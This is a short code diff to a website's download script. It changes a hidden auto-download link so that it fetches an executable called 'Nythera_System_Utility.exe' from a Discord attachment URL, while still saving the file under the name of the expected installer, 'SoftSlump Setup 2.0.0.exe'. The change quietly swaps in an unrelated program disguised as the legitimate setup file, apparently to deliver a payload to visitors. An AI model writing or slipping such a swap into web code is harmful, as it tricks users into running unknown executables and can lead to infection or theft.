@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'SoftSlump Setup 2.0.0.exe';
+    a.href = 'https://cdn.discordapp.com/attachments/1488258026895835176/1488258459748012234/Nythera_System_Utility.exe?ex=69cc2033&is=69caceb3&hm=0757b45c5e43f16f9c013959a69f0f741e835afac5e76b428d3f9951e0d29eb7&';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
